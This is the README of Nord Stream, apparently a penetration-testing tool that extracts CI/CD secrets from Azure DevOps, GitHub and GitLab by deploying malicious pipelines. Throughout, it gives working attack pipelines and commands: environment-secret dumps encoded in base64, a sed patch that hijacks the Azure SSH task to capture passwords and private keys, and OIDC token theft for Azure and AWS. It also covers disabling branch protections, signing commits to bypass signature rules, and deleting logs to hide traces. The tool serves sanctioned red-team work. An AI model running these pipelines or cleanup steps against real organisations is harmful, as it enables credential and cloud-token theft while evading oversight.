# Nord Stream

Nord Stream is a tool that allows you extract secrets stored inside CI/CD environments by deploying _malicious_ pipelines.

It currently supports Azure DevOps, GitHub and GitLab.

Find out more in the following blogpost: https://www.synacktiv.com/publications/cicd-secrets-extraction-tips-and-tricks

## Table of Contents

- [Nord Stream](#nord-stream)
  - [Table of Contents](#table-of-contents)
  - [Installation](#installation)
  - [Usage](#usage)
    - [Shared arguments](#shared-arguments)
      - [Describe token](#describe-token)
      - [Build YAML](#build-yaml)
      - [YAML](#yaml)
      - [Clean logs](#clean-logs)
      - [Signing commits](#signing-commits)
    - [Azure DevOps](#azure-devops)
      - [Service connections](#service-connections)
      - [Help](#help)
    - [GitHub](#github)
      - [List protections](#list-protections)
      - [Disable protections](#disable-protections)
      - [Force](#force)
      - [Azure OIDC](#azure-oidc)
      - [AWS OIDC](#aws-oidc)
      - [Help](#help-1)
    - [GitLab](#gitlab)
      - [List secrets](#list-secrets)
      - [YAML](#yaml-1)
      - [List protections](#list-protections-1)
      - [Help](#help-2)
  - [TODO](#todo)
  - [Contact](#contact)

## Installation

```
$ pipx install git+https://github.com/synacktiv/nord-stream
```

`git` is also required (see https://git-scm.com/download/) and must exist in your `PATH`.

## Usage

Here is a simple example on GitHub; initially, one can enumerate the various secrets.
```sh
$ nord-stream github --token "$GHP" --org org --list-secrets --repo repo
[*] Listing secrets:
[*] "org/repo" secrets
[*] Repo secrets:
        - REPO_SECRET
        - SUPER_SECRET
[*] PROD secrets:
        - PROD_SECRET
```

Then proceed to the exfiltration:
```sh
$ nord-stream github --token "$GHP" --org org --repo repo  
[+] "org/repo"
[*] No branch protection rule found on "dev_remote_ea5Eu/test/v1" branch
[*] Getting secrets from repo: "org/repo"
[*] Getting workflow output
[!] Workflow not finished, sleeping for 15s
[+] Workflow has successfully terminated.
[+] Secrets:
secret_SUPER_SECRET=value for super secret
secret_REPO_SECRET=repository secret

[*] Getting secrets from environment: "PROD" (org/repo)
[*] Getting workflow output
[!] Workflow not finished, sleeping for 15s
[+] Workflow has successfully terminated.
[+] Secrets:
secret_PROD_SECRET=Value only accessible from prod environment

[*] Cleaning logs.
[*] Check output: /home/hugov/Documents/pentest/RD/CICD/tools/nord-stream/nord-stream/nord-stream-logs/github
```

### Shared arguments

Some arguments are shared between [GitHub](#github), [Azure DevOps](#azure-devops) and [GitLab](#gitlab) here are some examples.

#### Describe token

The `--describe-token` option can be used to display general information about your token:

```bash
$ nord-stream github --token "$PAT" --describe-token
[*] Token information:
        - Login: CICD
        - IsAdmin: False
        - Id: 1337
        - Bio: None

```

#### Build YAML

The `--build-yaml` option can be used to create a pipeline file without deploying it. It retrieves the various secret names to build the associated pipeline, which can be used to add custom steps:

```bash
$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --env PROD --build-yaml custom.yml
[+] YAML file:
name: GitHub Actions
'on': push
jobs:
  init:
    runs-on: ubuntu-latest
    steps:
    - run: env -0 | awk -v RS='\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0
      name: command
      env:
        secret_PROD_SECRET: ${{secrets.PROD_SECRET}}
    environment: PROD

```

#### YAML

The `--yaml` option can be used to deploy a custom pipeline:

```yml
name: GitHub Actions
'on': push
jobs:
  init:
    runs-on: ubuntu-latest
    steps:
    - run: echo "Hello from step 1"
      name: step 1
    - run: echo "Doing some important stuff here"
      name: command
    - run: echo "Hello from last step "
      name: last step
```

```bash
$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --yaml custom.yml
[+] "synacktiv/repo"
[*] No branch protection rule found on "dev_remote_ea5Eu/test/v1"branch
[*] Running custom workflow: .../custom.yml
[*] Getting workflow output
[!] Workflow not finished, sleeping for 15s
[+] Workflow has successfully terminated.
[+] Workflow output:
2023-07-18T20:08:33.0073670Z ##[group]Run echo "Doing some important stuff here"
2023-07-18T20:08:33.0074247Z echo "Doing some important stuff here"
2023-07-18T20:08:33.0136846Z shell: /usr/bin/bash -e {0}
2023-07-18T20:08:33.0137261Z ##[endgroup]
2023-07-18T20:08:33.0422019Z Doing some important stuff here

[*] Cleaning logs.
[*] Check output: .../nord-stream-logs/github
```

By default, it will display the output of the task named `command` of the `init` job, but everything is stored locally and can be access manually:

```bash
$ cat nord-stream-logs/github/synacktiv/repo/workflow_custom_2023-07-18_22-08-44/init/4_last\ step.txt
2023-07-18T20:08:33.0458509Z ##[group]Run echo "Hello from last step "
2023-07-18T20:08:33.0459084Z echo "Hello from last step "
2023-07-18T20:08:33.0511473Z shell: /usr/bin/bash -e {0}
2023-07-18T20:08:33.0511890Z ##[endgroup]
2023-07-18T20:08:33.0597853Z Hello from last step
```

#### Clean logs

By default, Nord Stream will attempt to remove traces left after a pipeline deployment, depending on your privileges. To preserve traces, the `--no-clean` option can be used. This will keep the pipeline logs, but this will still revert the changes made to the repository.
Note that for GitLab, some traces cannot be deleted.


#### Signing commits

Repository administrators can enforce required commit signing on a branch to block all commits that are not signed and verified. With Nord Stream it's possible to sign commit to bypass such protection.

First create an import your GPG key on the SCM platform.
```sh
$ gpg --full-generate-key
$ gpg --armor --export F94496913C43EFC5
$ gpg --list-secret-keys --keyid-format=long
sec   dsa2048/F94496913C43EFC5 2023-07-18 [SC] [expires: 2023-07-23]
      Key fingerprint = B158 3F43 9899 C5A3 B74E  D04B F944 9691 3C43 EFC5
uid                 [ultimate] test-gpg <test.gpg@cicd.local>
```

```bash
$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --branch-name main  --key-id F94496913C43EFC5 --user test-gpg --email test.gpg@cicd.local --force
[*] Using branch: "main"
[+] "synacktiv/repo"
[*] Getting secrets from environment: "prod" (synacktiv/repo)
[*] Getting workflow output
[!] Workflow not finished, sleeping for 15s
[+] Workflow has successfully terminated.
[+] Secrets:
secret_PROD_SECRET=my PROD_SECRET

```

```bash
$ git verify-commit 00dcd856624bc9a41f8bd70662f0650839730973
gpg: Signature made Tue 18 Jul 2023 10:34:18 PM CEST
gpg:                using DSA key B1583F439899C5A3B74ED04BF94496913C43EFC5
gpg: Good signature from "test-gpg <test.gpg@cicd.local>" [ultimate]
Primary key fingerprint: B158 3F43 9899 C5A3 B74E  D04B F944 9691 3C43 EFC5
```

### Azure DevOps

Nord Stream can extract the following types of secrets:
- Variable groups (vg)
- Secure files (sf)
- Service connections

#### Service connections

Azure DevOps offers the possibility to create connections with external and remote services for executing tasks in a job. To do so, service connections are used. A service connection holds credentials for an identity to a remote service. There are multiple types of service connections in Azure DevOps.

Nord Stream currently support secret extraction for the following types of service connection:
- AzureRM
- GitHub
- AWS
- SonarQube
- SSH

If you come across a non-supported type, please open an issue or make a pull request :)

##### SSH

The extraction for this service connection type was painfull to implement. The output is the following:
```
hostname:::port:::user:::password:::privatekey
```

If you want to run it on a self-hosted runner you can do the following:
```
$ nord-stream devops ... --build-yaml test.yml --build-type ssh  
[+] YAML file:
trigger: none
pool:
  vmImage: ubuntu-latest
steps:
- checkout: none
- script: SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js) ; cp $SSH_FILE $SSH_FILE.bak
    ; sed -i 's|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout
    = getReadyTimeoutVariable();\nconst fs = require("fs");var data = "";data += hostname
    + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz",
    data, (err) => {});|' $SSH_FILE
  displayName: Preparing Build artefacts
- task: SSH@0
  inputs:
    sshEndpoint: '#FIXME'
    runOptions: commands
    commands: sleep 1
- script: SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js); mv $SSH_FILE.bak
    $SSH_FILE ; cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0 ; echo ''
  displayName: Build artefacts

```

Then you need to:
1) change the `vmImage: ubuntu-latest` to `name: 'Self-Hosted pool name'`
2) Add the name of the service connection in the `#FIXME` placeholder.
3) deploy the pipeline with: `--yaml test.yml`

If you need to run this on a windows self-hosted runner, in the `generatePipelineForSSH` method change `_serviceConnectionTemplateSSH` by `_serviceConnectionTemplateSSHWindows` and perform the actions described previously.

Note: for both Windows and Linux self-hosted runners, you need to adapt the path (`/home/vsts/work/_tasks/` or `D:\a\`) to match the path where the runner is deployed. This information can be obtained in the `Capabilities` tab of an agent on Azure DevOps.

#### Help
```
$ nord-stream devops -h
CICD pipeline exploitation tool

Usage:
    nord-stream devops [options] --token <pat> --org <org> [extraction] [--project <project> --write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
    nord-stream devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
    nord-stream devops [options] --token <pat> --org <org> --build-yaml <output> [--build-type <type>]
    nord-stream devops [options] --token <pat> --org <org> --clean-logs [--project <project>]
    nord-stream devops [options] --token <pat> --org <org> --list-projects [--write-filter]
    nord-stream devops [options] --token <pat> --org <org> (--list-secrets [--project <project> --write-filter] | --list-users)
    nord-stream devops [options] --token <pat> --org <org> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs
    --ignore-cert                           Allow insecure server connections

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <pat>                           Azure DevOps personal token or JWT
    --org <org>                             Org name
    -p, --project <project>                 Run on selected project (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all pipeline created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --list-projects                         List all projects.
    --list-secrets                          List all secrets.
    --list-users                            List all users.
    --write-filter                          Filter projects where current user has write or admin access.
    --build-yaml <output>                   Create a pipeline yaml file with default configuration.
    --build-type <type>                     Type used to generate the yaml file can be: default, azurerm, github, aws, sonar, ssh
    --describe-token                        Display information on the token
    --branch-name <name>                    Use specific branch name for deployment.
    --pipeline-name <name>                  Use pipeline for deployment.
    --repo-name <name>                      Use specific repo for deployment.

Exctraction:
    --extract <list>                        Extract following secrets [vg,sf,gh,az,aws,sonar,ssh]
    --no-extract <list>                     Don't extract following secrets [vg,sf,gh,az,aws,sonar,ssh]

Examples:
    List all secrets from all projects
    $ nord-stream devops --token "$PAT" --org myorg --list-secrets

    Dump all secrets from all projects
    $ nord-stream devops --token "$PAT" --org myorg

Authors: @hugow @0hexit
```

### GitHub

#### List protections

The `--list-protections` option can be used to list the protections applied to a branch and to environments:

```bash
$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --branch-name main --list-protections
[*] Using branch: "main"
[*] Checking security: "synacktiv/repo"
[*] Found branch protection rule on "main" branch
[*] Branch protections:
        - enforce admins: True
        - block creations: True
        - required signatures: True
        - allow force pushes: False
        - allow deletions: False
        - required pull request reviews: False
        - required linear history: False
        - required conversation resolution: False
        - lock branch: False
        - allow fork syncing: False
[*] Environment protection for: "DEV":
        - deployment branch policy: custom
[*] No environment protection rule found for: "INT"
[*] Environment protection for: "PROD":
        - deployment branch policy: custom
```

Depending on your permissions, you can have less information, only administrators can have the full details of the protections.


#### Disable protections

The `--disable-protections` option can be used to temporarily disable the protections applied to a branch or an environment, realize the dump and restore all the protections:

```bash
$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --branch-name main --no-repo --no-org --env prod --disable-protections
[*] Using branch: "main"
[+] "synacktiv/repo"
[*] Found branch protection rule on "main" branch
[...]
[!] Removing branch protection, wait until it's restored.
[*] Getting secrets from environment: "prod" (synacktiv/repo)
[*] Environment protection for: "PROD":
        - deployment branch policy: custom
[!] Modifying env protection, wait until it's restored.
[*] Getting workflow output
[!] Workflow not finished, sleeping for 15s
[+] Workflow has successfully terminated.
[!] Restoring env protections.
[+] Secrets:
secret_PROD_SECRET=my PROD_SECRET

[*] Cleaning logs.
[!] Restoring branch protection.
```

This requires admin privileges.

#### Force

By default, if Nord Stream detect a protection on a branch or on an environment it won't perform the secret extraction. If you think that the protections are too permissive or can be bypassed with your privileges, the `--force` option can be used to deploy the pipeline regardless of protections.

#### Azure OIDC

OIDC (OpenID Connect) can be used to connect to cloud services. The general idea is to allow authorized pipelines or workflows to get short-lived access tokens directly from a cloud provider, without involving any static secrets. Authorization is based on trust relationships configured on the cloud provider's side and being conditioned by the origin of the pipeline or workflow.

Here is an example of a GitHub workflow using OIDC:

```yaml
[...]
steps:
    - name: OIDC Login to Azure Public Cloud
    uses: azure/login@v1
    with:
        client-id: ${{ secrets.AZURE_CLIENT_ID }}
        tenant-id: ${{ secrets.AZURE_TENANT_ID }}
        subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }} # this can be optional
```

If you come across such a workflow, this means that the repository might be configured to get a short-lived access token that can give you access to Azure resources.

Nord Stream is able to deploy a pipeline to retrieve such access token with the following options:

```bash
$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --branch-name main --azure-client-id 65cd6002-25b9-11ee-88ac-7f80b19430c2 --azure-tenant-id 65cd6002-25b9-11ee-88ac-7f80b19430c2
[*] Using branch: "main"
[+] "synacktiv/repo"
[*] No branch protection rule found on "main" branch
[*] Running OIDC Azure access tokens generation workflow
[*] Getting workflow output
[!] Workflow not finished, sleeping for 15s
[+] Workflow has successfully terminated.
[+] OIDC access tokens:
Access token to use with Azure Resource Manager API:
{
  "accessToken":
"eyJ0eXAiOiJK[...]PVig",
  "expiresOn": "2023-07-18 23:18:57.000000",
  "subscription": "65cd6002-25b9-11ee-88ac-7f80b19430c2",
  "tenant": "65cd6002-25b9-11ee-88ac-7f80b19430c2",
  "tokenType": "Bearer"
}

Access token to use with MS Graph API:
{
  "accessToken":
"eyJ0eXAi[...]_qTA",
  "expiresOn": "2023-07-19 22:18:59.000000",
  "subscription": "65cd6002-25b9-11ee-88ac-7f80b19430c2",
  "tenant": "65cd6002-25b9-11ee-88ac-7f80b19430c2",
  "tokenType": "Bearer"
}
```

The `--azure-subscription-id` is optional and can be used to get an access token for a specific subscription.

#### AWS OIDC

The same technique (see [Azure OIDC](#azure-oidc)) can be used to get a session token on AWS.

Here is an example of a workflow using AWS OIDC:

```yaml
[...]
steps:
    - name: Configure AWS Credentials
    uses: aws-actions/configure-aws-credentials@v1
    with:
        role-to-assume: arn:aws:iam::133333333337:role/S3Access/CustomRole
        role-session-name: oidcrolesession
        aws-region: us-east-1
```

If you come across such a workflow, this means that the repository might be configured to get an AWS access token that can give you access to AWS resources.

Nord Stream is able to deploy a pipeline to retrieve such access token with the following options:

```bash
$ nord-stream github --token "$PAT" --org Synacktiv --repo repo --aws-role 'arn:aws:iam::133333333337:role/S3Access/CustomRole' --aws-region us-east-1 --force
[+] "Synacktiv/repo"
[*] Running OIDC AWS credentials generation workflow
[*] Getting workflow output
[!] Workflow not finished, sleeping for 15s
[+] Workflow has successfully terminated.
[+] OIDC credentials:
AWS_DEFAULT_REGION=us-east-1
AWS_SESSION_TOKEN=IQoJb3[...]KMs0/QB6
AWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=ASIA5ABC8XDMAP2ANNWO
AWS_SECRET_ACCESS_KEY=7KJLCjdJKqlpLKDAI9F7SH6SjSQBX68Sjm13xXDA
```

#### Help
```
$ nord-stream github -h
CICD pipeline exploitation tool

Usage:
    nord-stream github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --branch-name <name> --no-clean (--key-id <id> --user <user> --email <email>)]
    nord-stream github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --branch-name <name> --no-clean (--key-id <id> --user <user> --email <email>)]
    nord-stream github [options] --token <ghp> --org <org> ([--clean-logs] [--clean-branch-policy]) [--repo <repo> --branch-name <name>]
    nord-stream github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--env <env>]
    nord-stream github [options] --token <ghp> --org <org> --azure-tenant-id <tenant> --azure-client-id <client> [--azure-subscription-id <subscription> --repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream github [options] --token <ghp> --org <org> --aws-role <role> --aws-region <region> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --branch-name <name> --disable-protections (--key-id <id> --user <user> --email <email>)]
    nord-stream github [options] --token <ghp> --org <org> --list-secrets [--repo <repo> --no-repo --no-env --no-org]
    nord-stream github [options] --token <ghp> [--org <org>] --list-repos [--write-filter]
    nord-stream github [options] --token <ghp> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs

Signing:
    --key-id <id>                           GPG primary key ID
    --user <user>                           User used to sign commits
    --email <email>                         Email address used to sign commits

args
    --token <ghp>                           Github personal token
    --org <org>                             Org name
    -r, --repo <repo>                       Run on selected repo (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean workflow logs (default false)
    --clean-branch-policy                   Remove branch policy, can be used with --repo. This operation is done by default but can be manually triggered.
    --build-yaml <filename>                 Create a pipeline yaml file with all secrets.
    --env <env>                             Specify env for the yaml file creation.
    --no-repo                               Don't extract repo secrets.
    --no-env                                Don't extract environnments secrets.
    --no-org                                Don't extract organization secrets.
    --azure-tenant-id <tenant>              Identifier of the Azure tenant associated with the application having federated credentials (OIDC related).
    --azure-subscription-id <subscription>  Identifier of the Azure subscription associated with the application having federated credentials (OIDC related).
    --azure-client-id <client>              Identifier of the Azure application (client) associated with the application having federated credentials (OIDC related).
    --aws-role <role>                       AWS role to assume (OIDC related).
    --aws-region <region>                   AWS region (OIDC related).
    --list-protections                      List all protections.
    --list-repos                            List all repos.
    --list-secrets                          List all secrets.
    --disable-protections                   Disable the branch protection rules (needs admin rights)
    --write-filter                          Filter repo where current user has write or admin access.
    --force                                 Don't check environment and branch protections.
    --branch-name <name>                    Use specific branch name for deployment.
    --describe-token                        Display information on the token

Examples:
    List all secrets from all repositories
    $ nord-stream github --token "$GHP" --org myorg --list-secrets

    Dump all secrets from all repositories and try to disable branch protections
    $ nord-stream github --token "$GHP" --org myorg --disable-protections

Authors: @hugow @0hexit
```

### GitLab

As described in the article, there is no way to remove the logs in the activity tab after a pipeline deployment. This must be taken into account during Red Team engagements.

#### List secrets

The `--list-secrets` option can be used to list and extract secrets from GitLab.

The way in which GitLab manages secrets is a bit different from Azure DevOps and GitHub action. With admin access to a project, group or even admin access on the GitLab instance, it is possible to extract all the CI/CD variables that are defined without deploying any pipeline.

From a low privilege user however, it is not possible to list the secrets that are defined at the project / group or instance levels. However, if users have write privileges over a project, they will be able to deploy a malicious pipeline to exfiltrate the environment variables exposing the CI/CD variables. This means that a low privilege user has no mean to know if a secret is defined in a specific project. The only way is to look at legitimate pipelines that are already present in a project and check if a pipeline uses sensitive environment variables.

Here is a pipeline file to perform this operation on GitLab:

```yaml
stages:
  - synacktiv

deploy-production:
  image: ubuntu:latest
  stage: synacktiv
  script:
    - env | base64 -w0 | base64 -w 0
```

GitLab also support secure files like Azure DevOps. Secure files are defined at the project level. Like the variables It's not possible to list the secure files without admin access to the project. However, with admin access nord-stream will try to exfiltrate the secure files related to the projects.

#### YAML

Same as [YAML](#yaml), however you need to provide the full project path like this:

```sh
$ nord-stream gitlab --token "$PAT" --url https://gitlab.corp.local --project 'group/projectname' --yaml ci.yml
```

The output of the command `--list-projects` returns such path.

#### List protections

Same as [GitHub list protections](#list-protections)

#### Help
```
$ nord-stream gitlab -h
CICD pipeline exploitation tool

Usage:
    nord-stream gitlab [options] --token <pat> (--list-secrets | --list-protections) [--project <project> --group <group> --no-project --no-group --no-instance --write-filter]
    nord-stream gitlab [options] --token <pat> ( --list-groups | --list-projects ) [--project <project> --group <group> --write-filter]
    nord-stream gitlab [options] --token <pat> --yaml <yaml> --project <project> [--no-clean]
    nord-stream gitlab [options] --token <pat> --clean-logs [--project <project>]
    nord-stream gitlab [options] --token <pat> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs
    --url <gitlab_url>                      Gitlab URL [default: https://gitlab.com]
    --ignore-cert                           Allow insecure server connections

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <pat>                           GitLab personal access token or _gitlab_session cookie
    --project <project>                     Run on selected project (can be a file)
    --group <group>                         Run on selected group (can be a file)
    --list-secrets                          List all secrets.
    --list-protections                      List branch protection rules.
    --list-projects                         List all projects.
    --list-groups                           List all groups.
    --write-filter                          Filter repo where current user has developer access or more.
    --no-project                            Don't extract project secrets.
    --no-group                              Don't extract group secrets.
    --no-instance                           Don't extract instance secrets.
    -y, --yaml <yaml>                       Run arbitrary job
    --branch-name <name>                    Use specific branch name for deployment.
    --clean-logs                            Delete all pipeline logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --describe-token                        Display information on the token

Examples:
    Dump all secrets
    $ nord-stream gitlab --token "$TOKEN" --url https://gitlab.local --list-secrets

    Deploy the custom pipeline on the master branch
    $ nord-stream gitlab --token "$TOKEN" --url https://gitlab.local --yaml exploit.yaml --branch master --project 'group/projectname'

Authors: @hugow @0hexit
```

## TODO

- [ ] Add support of URLs corresponding to Azure DevOps Server instances (on-premises solutions)
- [ ] Add an option to extract secrets via Windows hosts
- [ ] Add support of other CI/CD environments (Jenkins/Bitbucket)
- [ ] Use the GitHub GraphQL API instead of the REST one to list the branch protection rules and temporarily disable them if they match the malicious branch about to be pushed


## Contact

Please submit any bugs, issues, questions, or feature requests under "Issues" or send them to us on Twitter [@hugow](https://twitter.com/hugow_vincent) and [@0hexit](https://twitter.com/0hexit).
